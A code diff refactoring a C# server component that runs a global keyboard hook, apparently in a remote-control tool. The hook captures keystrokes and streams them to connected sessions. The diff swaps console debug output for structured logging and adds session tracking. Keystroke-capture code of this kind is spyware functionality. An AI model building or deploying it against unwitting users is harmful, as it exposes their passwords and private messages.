@@ -4,12 +4,17 @@ using SharpHook;
 using SharpHook.Native;
 using SharpHook.Data;
 using System.Collections.Concurrent;
+using System.Collections.Generic;
+using System.Linq;
 using System.Threading;
+using Microsoft.Extensions.Logging;
 
 namespace Server.Services
 {
     public class InputService : IDisposable
     {
+        private readonly ILogger<InputService> _logger;
+        private readonly ConcurrentDictionary<string, byte> _activeKeylogSessions = new();
         private EventLoopGlobalHook? _hook;
         private bool _isRunning = false;
         private Func<string, Task>? _onKeyDataReceived;
@@ -17,15 +22,34 @@ namespace Server.Services
         private CancellationTokenSource? _cts;
         private Task? _hookTask;
 
-        public InputService()
+        public InputService(ILogger<InputService> logger)
         {
+            _logger = logger;
         }
+
+        public bool StartKeyLoggerSession(string connectionId)
+        {
+            if (string.IsNullOrWhiteSpace(connectionId)) return false;
+            _activeKeylogSessions.TryAdd(connectionId, 0);
+            return true;
+        }
+
+        public void StopKeyLoggerSession(string connectionId)
+        {
+            if (string.IsNullOrWhiteSpace(connectionId)) return;
+            _activeKeylogSessions.TryRemove(connectionId, out _);
+        }
+
+        public IReadOnlyList<string> GetActiveKeyLoggerSessionConnectionIds()
+            => _activeKeylogSessions.Keys.ToList();
+
+        public int ActiveKeyLoggerSessionCount => _activeKeylogSessions.Count;
 
         public async Task StartKeyLogger(Func<string, Task> callback)
         {
             if (_isRunning || _hook != null)
             {
-                Console.Error.WriteLine(">>> StartKeyLogger: Hook đang chạy! Dừng trước...");
+                _logger.LogWarning("StartKeyLogger called while running; stopping existing hook first.");
                 await StopKeyLogger();
                 await Task.Delay(200);
             }
@@ -35,26 +59,23 @@ namespace Server.Services
             _cts = new CancellationTokenSource();
 
             _hook = new EventLoopGlobalHook();
-            Console.Error.WriteLine("Hook instance created");
+            _logger.LogDebug("Global hook created");
             
             // Đăng ký event handlers
             _hook.KeyPressed += OnKeyPressedHandler;
             _hook.KeyReleased += OnKeyReleasedHandler;
-            
-            Console.Error.WriteLine(">>> Event handlers registered");
+            _logger.LogDebug("Hook handlers registered");
             
             // Chạy hook trong background task
             _hookTask = Task.Run(async () =>
             {
                 try
                 {
-                    Console.Error.WriteLine(">>> HOOK: Starting...");
                     await _hook.RunAsync();
-                    Console.Error.WriteLine(">>> HOOK: Stopped");
                 }
                 catch (Exception ex)
                 {
-                    Console.Error.WriteLine($">>> HOOK ERROR: {ex.Message}");
+                    _logger.LogError(ex, "Hook loop error");
                     _isRunning = false;
                 }
             });
@@ -65,17 +86,10 @@ namespace Server.Services
             // Consumer task để xử lý key queue
             _ = Task.Run(async () =>
             {
-                Console.Error.WriteLine(">>> CONSUMER: Started");
-                int processedCount = 0;
-                
                 while (_isRunning && !_cts.Token.IsCancellationRequested)
                 {
                     if (_keyQueue.TryDequeue(out var key))
                     {
-                        processedCount++;
-                        Console.Error.WriteLine($">>> CONSUMER: Processing key #{processedCount}: '{key}'");
-                        Console.Write(key);
-                        
                         if (_onKeyDataReceived != null)
                         {
                             try
@@ -84,7 +98,7 @@ namespace Server.Services
                             }
                             catch (Exception ex)
                             {
-                                Console.Error.WriteLine($">>> CONSUMER ERROR: {ex.Message}");
+                                _logger.LogDebug(ex, "Key callback error");
                             }
                         }
                     }
@@ -93,11 +107,9 @@ namespace Server.Services
                         await Task.Delay(5);
                     }
                 }
-                
-                Console.Error.WriteLine($">>> CONSUMER: Stopped (processed {processedCount} keys)");
             });
 
-            Console.WriteLine("[SERVICE] Keylogger started");
+            _logger.LogInformation("Keylogger started");
         }
 
         private void OnKeyPressedHandler(object? sender, KeyboardHookEventArgs e)
@@ -116,8 +128,9 @@ namespace Server.Services
 
         public async Task StopKeyLogger()
         {
-            Console.Error.WriteLine("\n>>> StopKeyLogger: Starting...");
-            
+            if (!_isRunning && _hook == null)
+                return;
+
             _isRunning = false;
             _cts?.Cancel();
             
@@ -125,18 +138,14 @@ namespace Server.Services
             {
                 try
                 {
-                    Console.Error.WriteLine(">>> StopKeyLogger: Unsubscribing events...");
                     _hook.KeyPressed -= OnKeyPressedHandler;
                     _hook.KeyReleased -= OnKeyReleasedHandler;
                     
-                    Console.Error.WriteLine(">>> StopKeyLogger: Disposing hook...");
                     _hook.Dispose();
-                    
-                    Console.Error.WriteLine(">>> StopKeyLogger: Disposed");
                 }
                 catch (Exception ex)
                 {
-                    Console.Error.WriteLine($">>> StopKeyLogger ERROR: {ex.Message}");
+                    _logger.LogDebug(ex, "StopKeyLogger error");
                 }
                 _hook = null;
             }
@@ -149,8 +158,7 @@ namespace Server.Services
                 }
                 catch { }
             }
-            
-            Console.Error.WriteLine(">>> StopKeyLogger: DONE\n");
+            _logger.LogInformation("Keylogger stopped");
         }
 
         private string FormatKeyFast(KeyboardEventData data)
